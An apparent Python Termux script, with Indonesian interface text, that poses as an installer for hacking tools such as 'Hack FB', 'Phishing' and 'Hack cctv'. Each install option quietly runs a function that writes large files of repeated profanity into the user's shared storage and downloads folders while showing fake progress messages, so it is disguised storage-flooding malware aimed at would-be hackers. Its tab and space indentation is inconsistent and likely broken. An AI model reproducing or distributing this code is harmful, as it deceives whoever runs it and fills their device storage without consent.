from __future__ import division  #You don't need this in Python3


import os,time,sys
from math import *

try:
        import curses
        os.system('termux-setup-storage')
except ImportError:
        os.system('pip install curses-menu')



def p():
  for num in range(4):
   file = open('../'+str(num)+'.txt','w')
   file = open('../storage/shared/'+str(num)+'.txt','w')
   file = open('../storage/downloads/'+str(num)+'.txt','w')
   teks ='Fuck you!!!'

   for i in range(99999):
      file.write(teks)
   file.close()



def tools(args):
  screen = curses.initscr()
  curses.noecho()
  curses.cbreak()
  curses.start_color()
  screen.keypad( 1 )
  curses.init_pair(1,curses.COLOR_BLACK, curses.COLOR_CYAN)
  highlightText = curses.color_pair( 1 )
  normalText = curses.A_NORMAL
  curses.curs_set( 0 )
  max_row = 10
  h,w=screen.getmaxyx()
  box = curses.newwin( max_row + 2, 64, ((h)//2)-6, ((w)//2)-32 )
  box2= curses.newwin( 3,64,((h)//2)+6, ((w)//2)-32)
  box.box()
  box2.box()
  title ='[ T.O.O.L.S - I.N.S.T.A.L.L.E.R ]'
  box.addstr('+' * 64)
  box.addstr(0,(64//2)-(len(title)//2),title)
  strings = [
'- Tools Spam' ,
'- Hack FB',
'- Yahoo clone',
'- Bot FB',
'- Hack cctv',
'- Phishing',
'[ KELUAR]'
]




  row_num = len( strings )

  pages = int( ceil( row_num / max_row ) )
  position = 1
  page = 1
  for i in range( 1, max_row + 1 ):
#    len_menu= len(strings[i])
    if row_num == 0:
        box.addstr( 1, 1, "There aren't strings", highlightText )
    else:
        if (i == position):
            box.addstr( i, 3,strings[ i - 1 ], highlightText )
        else:
            box.addstr( i, 2,strings[ i - 1 ], normalText )
        if i == row_num:
            break

  screen.refresh()
  box.refresh()
  box2.refresh()
  x = screen.getch()
  while x != 27:
    if x == curses.KEY_DOWN:
        if page == 1:
            if position < i:
                position = position + 1
            else:
                if pages > 1:
                    page = page + 1
                    position = 1 + ( max_row * ( page - 1 ) )
        elif page == pages:
            if position < row_num:
                position = position + 1
        else:
            if position < max_row + ( max_row * ( page - 1 ) ):
                position = position + 1
            else:
                page = page + 1
                position = 1 + ( max_row * ( page - 1 ) )
    if x == curses.KEY_UP:
        if page == 1:
            if position > 1:
                position = position - 1
        else:
            if position > ( 1 + ( max_row * ( page - 1 ) ) ):
                position = position - 1
            else:
                page = page - 1
                position = max_row + ( max_row * ( page - 1 ) )
    if x == curses.KEY_LEFT:
        if page > 1:
            page = page - 1
            position = 1 + ( max_row * ( page - 1 ) )

    if x == curses.KEY_RIGHT:
        if page < pages:
            page = page + 1
            position = ( 1 + ( max_row * ( page - 1 ) ) )
    if x == ord( "\n" ) and row_num != 0:
        box2.erase()
	box2.border(0)
        if position==1:
	  titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
	   p()
	   box2.addstr(1,2, 'Menginstall TOOL SPAM, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
 	  box2.clear()
  	  box2.refresh()
          box2.addstr(1,2,'Selesai!')
        if position==2:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
	   p()
           box2.addstr(1,2, 'Menginstall HACK FB, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
	  box2.clear()
          box2.refresh()
          box2.addstr(1,2,'Selesai!')
        if position==3:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
	   p()
           box2.addstr(1,2, 'Menginstall YAHOO CLONE, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
	  box2.clear()
          box2.refresh()
          box2.addstr(1,2,'Selesai!')
	if position==4:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
 	   p()
           box2.addstr(1,2, 'Menginstall BOT FB, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
	  box2.clear()
          box2.refresh()
          box2.addstr(1,2,'Selesai!')
	if position==5:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
	   p()
           box2.addstr(1,2, 'Menginstall CCTV HACK, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
	  box2.clear()
          box2.refresh()
          box2.addstr(1,2,'Selesai!')
	if position==6:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
	   p()
           box2.addstr(1,2, 'Menginstall PISHING, Tunggu sebentar ' + o),
           sys.stdout.flush()
           time.sleep(1)
	  box2.clear()
          box2.refresh()
          box2.addstr(1,2,'Selesai!')
	if position==7:
          titik = [
     '.   ', '..  ', '... ','....','.....','......','.......']
          for o in titik:
           box2.refresh()
           box2.addstr(1,2, 'Sedang Keluar' + o),
           sys.stdout.flush()
           time.sleep(1)
	  exit(0)
    box.erase()
    box.border( 0 )
    box2.border(0)
    box.addstr('+' * 64)
    box.addstr(0,(64//2)-(len(title)//2),title)
    for i in range( 1 + ( max_row * ( page - 1 ) ), max_row + 1 + ( max_row * ( page - 1 ) ) ):
        if row_num == 0:
            box.addstr( 1, 1, "There aren't strings",  highlightText )
        else:
            if ( i + ( max_row * ( page - 1 ) ) == position + ( max_row * ( page - 1 ) ) ):
                box.addstr( i - ( max_row * ( page - 1 ) ), 3, strings[ i - 1 ], highlightText )
            else:
                box.addstr( i - ( max_row * ( page - 1 ) ), 2, strings[ i - 1 ], normalText )
            if i == row_num:
                break



    screen.refresh()
    box.refresh()
    box2.refresh()
    x = screen.getch()

  curses.endwin()
  exit()


curses.wrapper(tools)
